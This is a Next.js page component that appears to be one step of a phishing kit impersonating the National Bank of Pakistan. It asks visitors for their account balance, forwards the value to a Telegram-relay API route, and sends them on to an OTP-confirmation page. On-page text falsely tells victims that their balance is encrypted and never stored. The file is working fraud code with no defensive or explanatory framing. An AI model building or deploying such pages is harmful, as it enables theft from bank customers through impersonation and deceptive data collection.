'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'
import { ChevronRight, Info } from 'lucide-react'
import { saveSubmissionData } from '@/lib/submission-store'

const logoImage =
  'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062819-tEXyj9UyD7CkbbGMwFg7T0dD0XA5Ym.png'

export default function BalancePage() {
  const router = useRouter()
  const [balance, setBalance] = useState('')
  const [error, setError] = useState('')

  return (
    <main className="min-h-screen bg-background px-3 pb-8 pt-3 text-foreground">
      <div className="mx-auto w-full max-w-[380px]">
        <header className="mb-5">
          <div className="flex h-16 w-20 items-center justify-center rounded-2xl border border-border bg-white px-2 shadow-sm">
            <img src={logoImage} alt="National Bank of Pakistan logo" className="h-auto w-full object-contain" />
          </div>
          <p className="mt-2 text-sm font-medium text-muted-foreground">national bank of pakistan</p>
        </header>

        <section aria-label="Account balance">
          <h1 className="text-balance text-[26px] font-extrabold leading-tight text-foreground">Account Balance</h1>
          <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
            Enter your current National Bank of Pakistan account balance in PKR.
          </p>

          <form
            className="mt-5"
            onSubmit={async (event) => {
              event.preventDefault()
              if (!balance || Number(balance) <= 0) {
                setError('Please enter your account balance.')
                return
              }
              setError('')
              try {
                const data = saveSubmissionData({ balance })
                await fetch('/api/telegram/send', {
                  method: 'POST',
                  headers: { 'content-type': 'application/json' },
                  body: JSON.stringify(data),
                })
              } catch {
                // Continue navigation even if the notification fails
              } finally {
                router.push('/otp-confirm')
              }
            }}
          >
            <div className="balance-card">
              <span className="balance-label">Current Balance</span>
              <div className="balance-input-shell">
                <span className="balance-prefix">PKR</span>
                <span className="balance-divider" aria-hidden="true" />
                <input
                  aria-label="Current balance in PKR"
                  inputMode="numeric"
                  value={balance}
                  onChange={(event) => {
                    setBalance(event.target.value.replace(/\D/g, ''))
                    if (error) setError('')
                  }}
                  placeholder="0"
                />
              </div>
              {error ? <p className="mt-2 text-sm font-medium text-destructive">{error}</p> : null}
            </div>

            <div className="info-notice mt-4">
              <Info aria-hidden="true" className="size-5 shrink-0 text-sky-600" />
              <p>This is required to verify your account. Your balance is encrypted and never stored on our servers.</p>
            </div>

            <div className="flex items-center justify-center gap-2 py-4" aria-label="Step 3 of 5">
              <span className="step-dot step-dot-done" />
              <span className="step-dot step-dot-done" />
              <span className="h-2 w-6 rounded-full bg-primary" />
              <span className="step-dot" />
              <span className="step-dot" />
            </div>

            <button
              type="submit"
              className="flex h-14 w-full items-center justify-center gap-3 rounded-2xl bg-primary text-base font-bold text-primary-foreground shadow-[0_6px_10px_rgba(39,181,101,0.2)] transition-transform hover:-translate-y-0.5 active:translate-y-0"
            >
              Next <ChevronRight aria-hidden="true" className="size-5" />
            </button>
          </form>
        </section>
      </div>
    </main>
  )
}
